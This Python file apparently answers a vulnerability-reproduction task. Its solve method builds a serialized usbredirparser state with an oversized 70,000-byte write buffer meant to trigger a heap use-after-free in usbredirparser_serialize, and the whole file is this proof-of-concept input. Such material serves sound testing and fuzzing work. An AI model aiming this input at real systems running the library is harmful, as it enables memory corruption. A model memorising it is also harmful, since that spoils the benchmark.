import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        # The vulnerability (Heap Use-After-Free in usbredirparser_serialize) is triggered
        # when the serialization buffer is reallocated due to a large amount of pending write data.
        # We construct a serialized state that, when unserialized and then re-serialized by the harness,
        # contains enough write buffer data to exceed the initial 64KB buffer.

        # USBREDIRPARSER_SERIALIZE_MAGIC = 0x8852cd70
        magic = 0x8852cd70
        
        # Payload size must exceed 64KB (65536 bytes) to trigger reallocation in serialize_data.
        # 70000 bytes provides a safe margin.
        payload_size = 70000
        
        # Construct the Write Buffer entry
        # Structure for each write buffer:
        # 1. Length (uint32)
        # 2. Data (Length bytes)
        # 3. free_on_send (uint32/int)
        write_buf_entry = struct.pack('<I', payload_size) + \
                          b'A' * payload_size + \
                          struct.pack('<I', 0)
        
        # Construct the Header
        header = bytearray()
        
        # 1. Magic (32-bit)
        header.extend(struct.pack('<I', magic))
        
        # 2. Length (32-bit) - Placeholder, will be updated with total length
        header.extend(struct.pack('<I', 0))
        
        # 3. Flags (32-bit)
        header.extend(struct.pack('<I', 0))
        
        # 4. Tols (32-bit)
        header.extend(struct.pack('<I', 0))
        
        # 5. Device Caps (16 bytes = 4 * uint32)
        header.extend(b'\x00' * 16)
        
        # 6. Host Caps (16 bytes = 4 * uint32)
        header.extend(b'\x00' * 16)
        
        # 7. Interface Count (8-bit)
        header.extend(struct.pack('<B', 0))
        
        # 8. Bulk Packet Count (8-bit)
        header.extend(struct.pack('<B', 0))
        
        # 9. Iso Packet Count (8-bit)
        header.extend(struct.pack('<B', 0))
        
        # 10. Interrupt Packet Count (8-bit)
        header.extend(struct.pack('<B', 0))
        
        # 11. Write Buf Count (32-bit)
        # We specify 1 write buffer.
        # The vulnerability involves a dangling pointer to this field's location in the buffer.
        header.extend(struct.pack('<I', 1))
        
        # Combine Header and Write Buffer
        full_poc = header + write_buf_entry
        
        # Update the Length field at offset 4 with the total size of the serialized data
        total_len = len(full_poc)
        struct.pack_into('<I', full_poc, 4, total_len)
        
        return bytes(full_poc)